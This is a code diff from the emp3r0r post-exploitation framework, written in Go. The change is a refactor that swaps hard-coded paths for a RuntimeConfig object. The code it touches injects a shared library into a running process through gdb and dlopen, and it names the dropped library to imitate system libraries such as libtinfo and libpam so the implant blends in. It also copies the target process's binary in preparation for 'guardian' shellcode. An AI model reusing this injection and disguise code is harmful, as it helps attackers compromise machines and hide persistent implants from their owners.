@@ -22,7 +22,7 @@ import (
 
 // inject a shared library using dlopen
 func gdbInjectSOWorker(path_to_so string, pid int) error {
-	gdb_path := emp3r0r_data.UtilsPath + "/gdb"
+	gdb_path := RuntimeConfig.UtilsPath + "/gdb"
 	if !util.IsFileExist(gdb_path) {
 		res := VaccineHandler()
 		if !strings.Contains(res, "success") {
@@ -60,7 +60,7 @@ func gdbInjectSOWorker(path_to_so string, pid int) error {
 		path_to_so,
 		gdb_path,
 		pid)
-	out, err := exec.Command(emp3r0r_data.UtilsPath+"/bash", "-c", gdb_cmd).CombinedOutput()
+	out, err := exec.Command(RuntimeConfig.UtilsPath+"/bash", "-c", gdb_cmd).CombinedOutput()
 	if err != nil {
 		return fmt.Errorf("%s: %s\n%v", gdb_cmd, out, err)
 	}
@@ -289,7 +289,7 @@ func GDBInjectSO(pid int) error {
 }
 
 func prepare_injectSO(pid int) (so_path string, err error) {
-	so_path = fmt.Sprintf("%s/libtinfo.so.2.1.%d", emp3r0r_data.UtilsPath, util.RandInt(0, 30))
+	so_path = fmt.Sprintf("%s/libtinfo.so.2.1.%d", RuntimeConfig.UtilsPath, util.RandInt(0, 30))
 	if os.Geteuid() == 0 {
 		root_so_path := fmt.Sprintf("/usr/lib/x86_64-linux-gnu/libpam.so.1.%d.1", util.RandInt(0, 20))
 		so_path = root_so_path
@@ -312,7 +312,7 @@ func prepare_guardian_sc(pid int) (shellcode string, err error) {
 	// prepare guardian_shellcode
 	proc_exe := util.ProcExe(pid)
 	// backup original binary
-	err = CopyProcExeTo(pid, emp3r0r_data.AgentRoot+"/"+util.FileBaseName(proc_exe))
+	err = CopyProcExeTo(pid, RuntimeConfig.AgentRoot+"/"+util.FileBaseName(proc_exe))
 	if err != nil {
 		return "", fmt.Errorf("failed to backup %s: %v", proc_exe, err)
 	}
